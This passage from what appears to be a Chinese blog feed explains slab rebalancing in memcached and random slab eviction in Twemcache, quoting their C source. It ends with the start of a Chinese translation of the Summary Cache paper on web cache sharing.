do_item_get</span></span><br><span class="line"><span class="comment"> * will prevent busy items from continuing to be busy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">NOTE:</span> This is checking it_flags outside of an item lock. I believe this</span></span><br><span class="line"><span class="comment"> * works since it_flags is 8 bits, and we&#x27;re only ever comparing a single bit</span></span><br><span class="line"><span class="comment"> * regardless. ITEM_SLABBED bit will always be correct since we&#x27;re holding the</span></span><br><span class="line"><span class="comment"> * lock which modifies that bit. ITEM_LINKED won&#x27;t exist if we&#x27;re between an</span></span><br><span class="line"><span class="comment"> * item having ITEM_SLABBED removed, and the key hasn&#x27;t been added to the item</span></span><br><span class="line"><span class="comment"> * yet. The memory barrier from the slabs lock should order the key write and the</span></span><br><span class="line"><span class="comment"> * flags to the item?</span></span><br><span class="line"><span class="comment"> * If ITEM_LINKED did exist and was just removed, but we still see it, that&#x27;s</span></span><br><span class="line"><span class="comment"> * still safe since it will have a valid key, which we then lock, and then</span></span><br><span class="line"><span class="comment"> * recheck everything.</span></span><br><span class="line"><span class="comment"> * This may not be safe on all platforms; If not, slabs_alloc() will need to</span></span><br><span class="line"><span class="comment"> * seed the item key while holding slabs_lock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">slab_rebalance_move</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">slabclass_t</span> *s_cls;</span><br><span class="line">    <span class="type">int</span> was_busy = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> refcount = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> hv;</span><br><span class="line">    <span class="type">void</span> *hold_lock;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">move_status</span> <span class="title">status</span> =</span> MOVE_PASS;</span><br><span class="line"></span><br><span class="line">    s_cls = &amp;slabclass[slab_rebal.s_clsid];</span><br><span class="line">    <span class="comment">// the offset to check if completed or not</span></span><br><span class="line">    <span class="type">int</span> offset = ((<span class="type">char</span>*)slab_rebal.slab_pos-(<span class="type">char</span>*)slab_rebal.slab_start)/(s_cls-&gt;size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// skip acquiring the slabs lock for items we&#x27;ve already fully processed.</span></span><br><span class="line">    <span class="keyword">if</span> (slab_rebal.completed[offset] == <span class="number">0</span>) &#123;</span><br><span class="line">        pthread_mutex_lock(&amp;slabs_lock);</span><br><span class="line">        hv = <span class="number">0</span>;</span><br><span class="line">        hold_lock = <span class="literal">NULL</span>;</span><br><span class="line">        item *it = slab_rebal.slab_pos;</span><br><span class="line"></span><br><span class="line">        item_chunk *ch = <span class="literal">NULL</span>;</span><br><span class="line">        status = MOVE_PASS;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (it-&gt;it_flags &amp; ITEM_CHUNK) &#123;</span><br><span class="line">            <span class="comment">/* This chunk is a chained part of a larger item. */</span></span><br><span class="line">            ch = (item_chunk *) it;</span><br><span class="line">            <span class="comment">/* Instead, we use the head chunk to find the item and effectively</span></span><br><span class="line"><span class="comment">             * lock the entire structure. If a chunk has ITEM_CHUNK flag, its</span></span><br><span class="line"><span class="comment">             * head cannot be slabbed, so the normal routine is safe. */</span></span><br><span class="line">            it = ch-&gt;head;</span><br><span class="line">            assert(it-&gt;it_flags &amp; ITEM_CHUNKED);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* ITEM_FETCHED when ITEM_SLABBED is overloaded to mean we&#x27;ve cleared</span></span><br><span class="line"><span class="comment">         * the chunk for move. Only these two flags should exist.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (it-&gt;it_flags != (ITEM_SLABBED|ITEM_FETCHED)) &#123;</span><br><span class="line">            <span class="comment">/* ITEM_SLABBED can only be added/removed under the slabs_lock */</span></span><br><span class="line">            <span class="keyword">if</span> (it-&gt;it_flags &amp; ITEM_SLABBED) &#123;</span><br><span class="line">                assert(ch == <span class="literal">NULL</span>);</span><br><span class="line">                slab_rebalance_cut_free(s_cls, it);</span><br><span class="line">                status = MOVE_FROM_SLAB;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((it-&gt;it_flags &amp; ITEM_LINKED) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">/* If it doesn&#x27;t have ITEM_SLABBED, the item could be in any</span></span><br><span class="line"><span class="comment">                 * state on its way to being freed or written to. If no</span></span><br><span class="line"><span class="comment">                 * ITEM_SLABBED, but it&#x27;s had ITEM_LINKED, it must be active</span></span><br><span class="line"><span class="comment">                 * and have the key written to it already.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                hv = hash(ITEM_key(it), it-&gt;nkey);</span><br><span class="line">                <span class="keyword">if</span> ((hold_lock = item_trylock(hv)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    status = MOVE_LOCKED;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">bool</span> is_linked = (it-&gt;it_flags &amp; ITEM_LINKED);</span><br><span class="line">                    refcount = refcount_incr(it);</span><br><span class="line">                    <span class="keyword">if</span> (refcount == <span class="number">2</span>) &#123; <span class="comment">/* item is linked but not busy */</span></span><br><span class="line">                        <span class="comment">/* Double check ITEM_LINKED flag here, since we&#x27;re</span></span><br><span class="line"><span class="comment">                         * past a memory barrier from the mutex. */</span></span><br><span class="line">                        <span class="keyword">if</span> (is_linked) &#123;</span><br><span class="line">                            status = MOVE_FROM_LRU;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">/* refcount == 1 + !ITEM_LINKED means the item is being</span></span><br><span class="line"><span class="comment">                             * uploaded to, or was just unlinked but hasn&#x27;t been freed</span></span><br><span class="line"><span class="comment">                             * yet. Let it bleed off on its own and try again later */</span></span><br><span class="line">                            status = MOVE_BUSY;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refcount &gt; <span class="number">2</span> &amp;&amp; is_linked) &#123;</span><br><span class="line">                        <span class="comment">// <span class="doctag">TODO:</span> Mark items for delete/rescue and process</span></span><br><span class="line">                        <span class="comment">// outside of the main loop.</span></span><br><span class="line">                        <span class="keyword">if</span> (slab_rebal.busy_loops &gt; SLAB_MOVE_MAX_LOOPS) &#123;</span><br><span class="line">                            slab_rebal.busy_deletes++;</span><br><span class="line">                            <span class="comment">// Only safe to hold slabs lock because refcount</span></span><br><span class="line">                            <span class="comment">// can&#x27;t drop to 0 until we release item lock.</span></span><br><span class="line">                            STORAGE_delete(storage, it);</span><br><span class="line">                            pthread_mutex_unlock(&amp;slabs_lock);</span><br><span class="line">                            do_item_unlink(it, hv);</span><br><span class="line">                            pthread_mutex_lock(&amp;slabs_lock);</span><br><span class="line">                        &#125;</span><br><span class="line">                        status = MOVE_BUSY;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (settings.verbose &gt; <span class="number">2</span>) &#123;</span><br><span class="line">                            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Slab reassign hit a busy item: refcount: %d (%d -&gt; %d)\n&quot;</span>,</span><br><span class="line">                                it-&gt;refcount, slab_rebal.s_clsid, slab_rebal.d_clsid);</span><br><span class="line">                        &#125;</span><br><span class="line">                        status = MOVE_BUSY;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">/* Item lock must be held while modifying refcount */</span></span><br><span class="line">                    <span class="keyword">if</span> (status == MOVE_BUSY) &#123;</span><br><span class="line">                        refcount_decr(it);</span><br><span class="line">                        item_trylock_unlock(hold_lock);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/* See above comment. No ITEM_SLABBED or ITEM_LINKED. Mark</span></span><br><span class="line"><span class="comment">                 * busy and wait for item to complete its upload. */</span></span><br><span class="line">                status = MOVE_BUSY;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> save_item = <span class="number">0</span>;</span><br><span class="line">        item *new_it = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="type">size_t</span> ntotal = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">switch</span> (status) &#123;</span><br><span class="line">            <span class="keyword">case</span> MOVE_FROM_LRU:</span><br><span class="line">                <span class="comment">/* Lock order is LRU locks -&gt; slabs_lock. unlink uses LRU lock.</span></span><br><span class="line"><span class="comment">                 * We only need to hold the slabs_lock while initially looking</span></span><br><span class="line"><span class="comment">                 * at an item, and at this point we have an exclusive refcount</span></span><br><span class="line"><span class="comment">                 * (2) + the item is locked. Drop slabs lock, drop item to</span></span><br><span class="line"><span class="comment">                 * refcount 1 (just our own, then fall through and wipe it</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="comment">/* Check if expired or flushed */</span></span><br><span class="line">                ntotal = ITEM_ntotal(it);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> EXTSTORE</span></span><br><span class="line">                <span class="keyword">if</span> (it-&gt;it_flags &amp; ITEM_HDR) &#123;</span><br><span class="line">                    ntotal = (ntotal - it-&gt;nbytes) + <span class="keyword">sizeof</span>(item_hdr);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                <span class="comment">/* REQUIRES slabs_lock: CHECK FOR cls-&gt;sl_curr &gt; 0 */</span></span><br><span class="line">                <span class="keyword">if</span> (ch == <span class="literal">NULL</span> &amp;&amp; (it-&gt;it_flags &amp; ITEM_CHUNKED)) &#123;</span><br><span class="line">                    <span class="comment">/* Chunked should be identical to non-chunked, except we need</span></span><br><span class="line"><span class="comment">                     * to swap out ntotal for the head-chunk-total. */</span></span><br><span class="line">                    ntotal = s_cls-&gt;size;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ((it-&gt;exptime != <span class="number">0</span> &amp;&amp; it-&gt;exptime &lt; current_time)</span><br><span class="line">                    || item_is_flushed(it)) &#123;</span><br><span class="line">                    <span class="comment">/* Expired, don&#x27;t save. */</span></span><br><span class="line">                    save_item = <span class="number">0</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">                        (new_it = slab_rebalance_alloc(ntotal, slab_rebal.s_clsid)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    <span class="comment">/* Not a chunk of an item, and nomem. */</span></span><br><span class="line">                    save_item = <span class="number">0</span>;</span><br><span class="line">                    slab_rebal.evictions_nomem++;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch != <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">                        (new_it = slab_rebalance_alloc(s_cls-&gt;size, slab_rebal.s_clsid)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    <span class="comment">/* Is a chunk of an item, and nomem. */</span></span><br><span class="line">                    save_item = <span class="number">0</span>;</span><br><span class="line">                    slab_rebal.evictions_nomem++;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">/* Was whatever it was, and we have memory for it. */</span></span><br><span class="line">                    save_item = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                pthread_mutex_unlock(&amp;slabs_lock);</span><br><span class="line">                <span class="keyword">if</span> (save_item) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (ch == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        assert((new_it-&gt;it_flags &amp; ITEM_CHUNKED) == <span class="number">0</span>);</span><br><span class="line">                        <span class="comment">/* if free memory, memcpy. clear prev/next/h_bucket */</span></span><br><span class="line">                        <span class="built_in">memcpy</span>(new_it, it, ntotal);</span><br><span class="line">                        new_it-&gt;prev = <span class="number">0</span>;</span><br><span class="line">                        new_it-&gt;next = <span class="number">0</span>;</span><br><span class="line">                        new_it-&gt;h_next = <span class="number">0</span>;</span><br><span class="line">                        <span class="comment">/* These are definitely required. else fails assert */</span></span><br><span class="line">                        new_it-&gt;it_flags &amp;= ~ITEM_LINKED;</span><br><span class="line">                        new_it-&gt;refcount = <span class="number">0</span>;</span><br><span class="line">                        do_item_replace(it, new_it, hv);</span><br><span class="line">                        <span class="comment">/* Need to walk the chunks and repoint head  */</span></span><br><span class="line">                        <span class="keyword">if</span> (new_it-&gt;it_flags &amp; ITEM_CHUNKED) &#123;</span><br><span class="line">                            item_chunk *fch = (item_chunk *) ITEM_schunk(new_it);</span><br><span class="line">                            fch-&gt;next-&gt;prev = fch;</span><br><span class="line">                            <span class="keyword">while</span> (fch) &#123;</span><br><span class="line">                                fch-&gt;head = new_it;</span><br><span class="line">                                fch = fch-&gt;next;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        it-&gt;refcount = <span class="number">0</span>;</span><br><span class="line">                        it-&gt;it_flags = ITEM_SLABBED|ITEM_FETCHED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG_SLAB_MOVER</span></span><br><span class="line">                        <span class="built_in">memcpy</span>(ITEM_key(it), <span class="string">&quot;deadbeef&quot;</span>, <span class="number">8</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                        slab_rebal.rescues++;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        item_chunk *nch = (item_chunk *) new_it;</span><br><span class="line">                        <span class="comment">/* Chunks always have head chunk (the main it) */</span></span><br><span class="line">                        ch-&gt;prev-&gt;next = nch;</span><br><span class="line">                        <span class="keyword">if</span> (ch-&gt;next)</span><br><span class="line">                            ch-&gt;next-&gt;prev = nch;</span><br><span class="line">                        <span class="built_in">memcpy</span>(nch, ch, ch-&gt;used + <span class="keyword">sizeof</span>(item_chunk));</span><br><span class="line">                        ch-&gt;refcount = <span class="number">0</span>;</span><br><span class="line">                        ch-&gt;it_flags = ITEM_SLABBED|ITEM_FETCHED;</span><br><span class="line">                        slab_rebal.chunk_rescues++;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG_SLAB_MOVER</span></span><br><span class="line">                        <span class="built_in">memcpy</span>(ITEM_key((item *)ch), <span class="string">&quot;deadbeef&quot;</span>, <span class="number">8</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                        refcount_decr(it);</span><br><span class="line">                    &#125;</span><br><span class="line">                    slab_rebal.completed[offset] = <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">/* unlink and mark as done if it&#x27;s not</span></span><br><span class="line"><span class="comment">                     * a chunked item as they require more book-keeping) */</span></span><br><span class="line">                    STORAGE_delete(storage, it);</span><br><span class="line">                    <span class="keyword">if</span> (!ch &amp;&amp; (it-&gt;it_flags &amp; ITEM_CHUNKED) == <span class="number">0</span>) &#123;</span><br><span class="line">                        do_item_unlink(it, hv);</span><br><span class="line">                        it-&gt;it_flags = ITEM_SLABBED|ITEM_FETCHED;</span><br><span class="line">                        it-&gt;refcount = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG_SLAB_MOVER</span></span><br><span class="line">                        <span class="built_in">memcpy</span>(ITEM_key(it), <span class="string">&quot;deadbeef&quot;</span>, <span class="number">8</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                        slab_rebal.completed[offset] = <span class="number">1</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        ntotal = ITEM_ntotal(it);</span><br><span class="line">                        do_item_unlink(it, hv);</span><br><span class="line">                        slabs_free(it, ntotal, slab_rebal.s_clsid);</span><br><span class="line">                        <span class="comment">/* Swing around again later to remove it from the freelist. */</span></span><br><span class="line">                        slab_rebal.busy_items++;</span><br><span class="line">                        was_busy++;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                item_trylock_unlock(hold_lock);</span><br><span class="line">                pthread_mutex_lock(&amp;slabs_lock);</span><br><span class="line">                <span class="comment">/* Always remove the ntotal, as we added it in during</span></span><br><span class="line"><span class="comment">                 * do_slabs_alloc() when copying the item.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> MOVE_FROM_SLAB:</span><br><span class="line">                slab_rebal.completed[offset] = <span class="number">1</span>;</span><br><span class="line">                it-&gt;refcount = <span class="number">0</span>;</span><br><span class="line">                it-&gt;it_flags = ITEM_SLABBED|ITEM_FETCHED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG_SLAB_MOVER</span></span><br><span class="line">                <span class="built_in">memcpy</span>(ITEM_key(it), <span class="string">&quot;deadbeef&quot;</span>, <span class="number">8</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> MOVE_BUSY:</span><br><span class="line">            <span class="keyword">case</span> MOVE_LOCKED:</span><br><span class="line">                slab_rebal.busy_items++;</span><br><span class="line">                was_busy++;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> MOVE_PASS:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        pthread_mutex_unlock(&amp;slabs_lock);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Note: slab_rebal.* is occasionally protected under slabs_lock, but</span></span><br><span class="line">    <span class="comment">// the mover thread is the only user while active: so it&#x27;s only necessary</span></span><br><span class="line">    <span class="comment">// for start/stop synchronization.</span></span><br><span class="line">    slab_rebal.slab_pos = (<span class="type">char</span> *)slab_rebal.slab_pos + s_cls-&gt;size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (slab_rebal.slab_pos &gt;= slab_rebal.slab_end) &#123;</span><br><span class="line">        <span class="comment">/* Some items were busy, start again from the top */</span></span><br><span class="line">        <span class="keyword">if</span> (slab_rebal.busy_items) &#123;</span><br><span class="line">            slab_rebal.slab_pos = slab_rebal.slab_start;</span><br><span class="line">            STATS_LOCK();</span><br><span class="line">            stats.slab_reassign_busy_items += slab_rebal.busy_items;</span><br><span class="line">            STATS_UNLOCK();</span><br><span class="line">            slab_rebal.busy_items = <span class="number">0</span>;</span><br><span class="line">            slab_rebal.busy_loops++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            slab_rebal.done++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> was_busy;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="三、-Twemcache实现方案"><a href="#三、-Twemcache实现方案" class="headerlink" title="三、 Twemcache实现方案"></a>三、 Twemcache实现方案</h2><h3 id="3-1、概念简介"><a href="#3-1、概念简介" class="headerlink" title="3.1、概念简介"></a>3.1、概念简介</h3><p>随机选取一个slab，然后释放该slab中的所有数据。</p><h3 id="3-2、代码实现"><a href="#3-2、代码实现" class="headerlink" title="3.2、代码实现"></a>3.2、代码实现</h3><p>选取随机的slab，然后执行剔除：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a random slab from all active slabs and evict it for new allocation.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that the slab_table enables us to have O(1) lookup for every slab in</span></span><br><span class="line"><span class="comment"> * the system. The inserts into the table are just appends - O(1) and there</span></span><br><span class="line"><span class="comment"> * are no deletes from the slab_table. These two constraints allows us to keep</span></span><br><span class="line"><span class="comment"> * our random choice uniform.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> slab *</span><br><span class="line"><span class="title function_">slab_evict_rand</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line">    <span class="type">uint32_t</span> tries;</span><br><span class="line"></span><br><span class="line">    tries = SLAB_RAND_MAX_TRIES;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        slab = slab_table_rand();</span><br><span class="line">        tries--;</span><br><span class="line">    &#125; <span class="keyword">while</span> (tries &gt; <span class="number">0</span> &amp;&amp; slab-&gt;refcount != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tries == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* all randomly chosen slabs are in use */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_debug(LOG_DEBUG, <span class="string">&quot;random-evicting slab %p with id %u&quot;</span>, slab, slab-&gt;id);</span><br><span class="line"></span><br><span class="line">    slab_evict_one(slab);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> slab;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>具体执行剔除的代码逻辑：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Evict a slab by evicting all the items within it. This means that the</span></span><br><span class="line"><span class="comment"> * items that are carved out of the slab must either be deleted from their</span></span><br><span class="line"><span class="comment"> * a) hash + lru Q, or b) free Q. The candidate slab itself must also be</span></span><br><span class="line"><span class="comment"> * delinked from its respective slab pool so that it is available for reuse.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Eviction complexity is O(#items/slab).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">slab_evict_one</span><span class="params">(<span class="keyword">struct</span> slab *slab)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">slabclass</span> *<span class="title">p</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">item</span> *<span class="title">it</span>;</span></span><br><span class="line">    <span class="type">uint32_t</span> i;</span><br><span class="line"></span><br><span class="line">    p = &amp;slabclass[slab-&gt;id];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* candidate slab is also the current slab */</span></span><br><span class="line">    <span class="keyword">if</span> (p-&gt;free_item != <span class="literal">NULL</span> &amp;&amp; slab == item_2_slab(p-&gt;free_item)) &#123;</span><br><span class="line">        p-&gt;nfree_item = <span class="number">0</span>;</span><br><span class="line">        p-&gt;free_item = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* delete slab items either from hash + lru Q or free Q */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; p-&gt;nitem; i++) &#123;</span><br><span class="line">        it = slab_2_item(slab, i, p-&gt;size);</span><br><span class="line"></span><br><span class="line">        ASSERT(it-&gt;magic == ITEM_MAGIC);</span><br><span class="line">        ASSERT(it-&gt;refcount == <span class="number">0</span>);</span><br><span class="line">        ASSERT(it-&gt;offset != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (item_is_linked(it)) &#123;</span><br><span class="line">            item_reuse(it);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (item_is_slabbed(it)) &#123;</span><br><span class="line">            ASSERT(slab == item_2_slab(it));</span><br><span class="line">            ASSERT(!TAILQ_EMPTY(&amp;p-&gt;free_itemq));</span><br><span class="line"></span><br><span class="line">            it-&gt;flags &amp;= ~ITEM_SLABBED;</span><br><span class="line"></span><br><span class="line">            ASSERT(p-&gt;nfree_itemq &gt; <span class="number">0</span>);</span><br><span class="line">            p-&gt;nfree_itemq--;</span><br><span class="line">            TAILQ_REMOVE(&amp;p-&gt;free_itemq, it, i_tqe);</span><br><span class="line">            stats_slab_decr(slab-&gt;id, item_free);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* unlink the slab from its class */</span></span><br><span class="line">    slab_lruq_remove(slab);</span><br><span class="line"></span><br><span class="line">    stats_slab_incr(slab-&gt;id, slab_evict);</span><br><span class="line">    stats_slab_decr(slab-&gt;id, slab_curr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3、效果演示-视频"><a href="#3-3、效果演示-视频" class="headerlink" title="3.3、效果演示(视频)"></a>3.3、效果演示(视频)</h3><iframe width="100%" height="315" src="https://www.youtube.com/embed/EtROv2or8SE" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>]]></content>
      
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
            <tag> Memcached </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>译 - Summary Cache: A Scalable Wide-Area Web Cache Sharing Protocol</title>
      <link href="/2020/05/23/bloom-filter-summary-cache-paper/"/>
      <url>/2020/05/23/bloom-filter-summary-cache-paper/</url>
      
        <content type="html"><![CDATA[<p>原文：<a href="http://pages.cs.wisc.edu/~jussara/papers/00ton.pdf">Summary Cache: A Scalable Wide-Area Web Cache Sharing Protocol</a></p><p>摘要缓存：可扩展的广域Web缓存共享协议</p><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>Web Proxy之间的共享缓存是减少Web流量并缓解网络瓶颈的一项重要技术。然而，由于现有协议的开销，它并未得到广泛部署。在本文中，我们演示了缓存共享的好处，衡量了现有协议的开销，并提出了一种称为”摘要缓存’’的新协议。在这个新协议中，每个Proxy都保留了一个包含所有Proxy的缓存摘要目录，并在任何查询之前都要检查在这些摘要之中是否存在潜在的匹配项。有两个因素利于我们协议的低开销：摘要的定期更新以及十分简朴的目录信息，每个条目只有<strong>8bits</strong>。通过使用跟踪驱动的仿真和原型实现，我们证明了与现有的协议（例如 Internet 的缓存协议ICP）相比，”摘要缓存”将<strong>缓存间协议消息的数量减少了25到60</strong>，带宽消耗<strong>减少了超过50%<strong>，</strong>消除了75%到95%的CPU处理协议开销</strong>，同时<strong>保持了与ICP几乎相同的缓存命中率</strong>。因此”摘要缓存”可以扩展到大量的Proxy。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>随着万维网的巨大增长给互联网带来的持续压力，缓存已经被认为是减少带宽消耗的最重要的技术之一[29]。特别是Web代理中的缓存已经被证明十分有效[14,33]。为了获得缓存的全部好处，常见瓶颈环节后面的代理环境应该相互配合并未彼此的未命中服务，从而进一步减少通过瓶颈的流量。我们称这个过程为 “Web缓存共享”。</p><p>Web共享缓存的概念最初是在Harvest项目中被提出的[26,12]。Harvest小组设计了Internet缓存协议（ICP）[18]，该协议支持从相邻的缓存中发现和检索文档。如今，很多机构和很多国家都建立了代理缓存的层次结构，这些层次结构通过ICP进行合作已减少Internet流量[25,30,41,5,14]。</p><p>然而，ICP协议的开销目前阻碍了Web共享缓存的广泛部署。ICP在代理发生缓存未命中的时候会讲查询消息多播到其他的代理来尝试在其他代理中命中该消息。因此随着代理数量的增加，通信和CPU的处理开销都将成倍的增加。</p><p>目前已经提出了很多替代协议来解决该问题，例如，一种在代理之间划分URL空间的缓存陈列路由协议[46]。但是，此类解决方案通常不适用于广域网缓存共享，其特点是代理之间的网络带宽有限以及代理与其用户之间的网络距离不均匀（例如，每个代理可能更靠近一个用户组而不是其他用户组）。</p><p>在本文中，我们解决了用于关于Web共享缓存的可伸缩协议的问题。我们首先通过分析Web访问跟踪的采集信息来检查Web共享缓存的好处。我们表明，在代理之间共享缓存的内存会显著减少Web服务器的通信量，并可简单的缓存共享（无需在代理的缓存之间进行协调）就足以获得完全协调的缓存的大部分好处。我们还通过运行一组代理基准来量化ICP协议的开销。结果表明，即使协作代理的数量低至四个，ICP也会讲代理间的流量增加70到90倍，每个代理接收到的网络数据包的数量也增加了13%甚至更多，并且CPU的开销也超过了15%。​ 